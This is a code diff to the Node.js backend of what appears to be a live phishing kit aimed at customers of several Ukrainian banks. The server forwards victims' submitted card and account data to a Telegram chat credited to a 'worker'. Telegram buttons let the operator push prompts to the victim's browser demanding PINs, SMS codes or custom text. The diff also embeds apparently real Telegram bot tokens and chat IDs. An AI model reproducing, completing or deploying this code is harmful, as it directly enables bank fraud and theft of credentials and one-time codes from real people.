@@ -5,8 +5,8 @@ const WebSocket = require('ws');
 const path = require('path');
 
 // НАСТРОЙКИ
-const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
-const CHAT_ID = '-4970332008';
+const TELEGRAM_BOT_TOKEN = '8226008404:AAHKvH74AnvUnJ5-xL_3Wf08TuNtovZeXTw';
+const CHAT_ID = '-4891781280';
 
 // Динамический webhook для Render
 const hostname = process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${process.env.PORT || 3000}`;
@@ -66,6 +66,7 @@ const wss = new WebSocket.Server({
 const clients = new Map();
 const sessions = new Map();
 const cardVisits = new Map(); // Для подсчёта по номеру карты
+let pendingCustom = new Map(); // Для СВОЙ: {sessionId: true}
 
 wss.on('connection', (ws) => {
     console.log('Client connected');
@@ -166,7 +167,7 @@ app.post('/api/submit', (req, res) => {
         }
         message += `<b>Worker:</b> @${workerNick}\n`;
 
-        sendToTelegram(message, sessionId, newData.bankName, bankTheme);
+        sendToTelegram(message, sessionId, newData.bankName, bankTheme || newData.bankName.toLowerCase());
     }
 
     res.status(200).json({ message: 'OK' });
@@ -214,7 +215,7 @@ function sendToTelegram(message, sessionId, bankName, bankTheme) {
         [
             { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
             { text: 'КОД', callback_data: `code_error:${sessionId}` },
-            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
+            { text: 'ТАЙМЕР', callback_data: `timer:${sessionId}` }
         ],
         [
             { text: 'НОМЕР', callback_data: `number_error:${sessionId}` }
@@ -234,7 +235,7 @@ function sendToTelegram(message, sessionId, bankName, bankTheme) {
 
     // Если банк не Ощад, убираем ЗВОНОК
     if (bankName !== 'Ощадбанк') {
-        keyboard = keyboard.filter(row => row[0].text !== 'ЗВОНОК');
+        keyboard[1] = keyboard[1].filter(btn => btn.text !== 'ЗВОНОК');
     }
 
     const options = {
@@ -260,15 +261,26 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                 ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                 break;
-            case 'lk_oschadbank':
+            case 'lk_oschad':
+                ws.send(JSON.stringify({ type: 'lk_oschad', data: {} }));
+                break;
             case 'lk_raiffeisen':
+                ws.send(JSON.stringify({ type: 'lk_raiffeisen', data: {} }));
+                break;
             case 'lk_vostok':
+                ws.send(JSON.stringify({ type: 'lk_vostok', data: {} }));
+                break;
             case 'lk_izibank':
+                ws.send(JSON.stringify({ type: 'lk_izibank', data: {} }));
+                break;
             case 'lk_ukrsib':
-                ws.send(JSON.stringify({ type, data: {} }));
+                ws.send(JSON.stringify({ type: 'lk_ukrsib', data: {} }));
                 break;
             case 'call_oschad':
                 ws.send(JSON.stringify({ type: 'call_oschad', data: {} }));
+                break;
+            case 'code_error':
+                ws.send(JSON.stringify({ type: 'code_error', data: {} }));
                 break;
             case 'request_details':
                 ws.send(JSON.stringify({ type: 'request_details', data: {} }));
@@ -289,19 +301,11 @@ bot.on('callback_query', (callbackQuery) => {
                 ws.send(JSON.stringify({ type: 'ban', data: {} }));
                 break;
             case 'custom':
-                // Для "СВОЙ" - ждём дополнительного сообщения от админа
-                bot.sendMessage(CHAT_ID, 'Введіть текст для клієнта:', {
-                    reply_markup: {
-                        inline_keyboard: [[{ text: 'Відправити', callback_data: `send_custom:${sessionId}` }]]
-                    }
-                });
-                // Здесь нужно обработать следующее сообщение, но для простоты используем force_reply или отдельный handler
-                // В реальности добавить bot.on('message') для обработки
+                pendingCustom.set(CHAT_ID, sessionId);
+                bot.sendMessage(CHAT_ID, 'Введіть текст для клієнта:');
                 break;
             case 'send_custom':
-                // Это упрощённо; в полном коде нужно хранить pending custom messages
-                const pendingText = 'Ваш кастомний текст тут'; // Заменить на реальный ввод
-                ws.send(JSON.stringify({ type: 'custom', data: { text: pendingText } }));
+                // Не используется, т.к. через message
                 break;
         }
         bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
@@ -311,12 +315,18 @@ bot.on('callback_query', (callbackQuery) => {
     }
 });
 
-// Обработка кастомных сообщений (упрощённо)
+// Обработка кастомных сообщений для СВОЙ
 bot.on('message', (msg) => {
-    if (msg.text && msg.chat.id.toString() === CHAT_ID) {
-        // Логика для отправки кастомного текста клиенту (нужен sessionId из контекста)
-        // Для этого нужно хранить состояние, например в Map pendingCustom[chatId] = {sessionId, text}
-        // Здесь placeholder
+    if (msg.text && msg.chat.id.toString() === CHAT_ID && pendingCustom.has(CHAT_ID)) {
+        const sessionId = pendingCustom.get(CHAT_ID);
+        const ws = clients.get(sessionId);
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'custom', data: { text: msg.text } }));
+            bot.sendMessage(CHAT_ID, 'Текст відправлено клієнту!');
+        } else {
+            bot.sendMessage(CHAT_ID, 'Помилка: клієнт не в мережі!');
+        }
+        pendingCustom.delete(CHAT_ID);
     }
 });
 
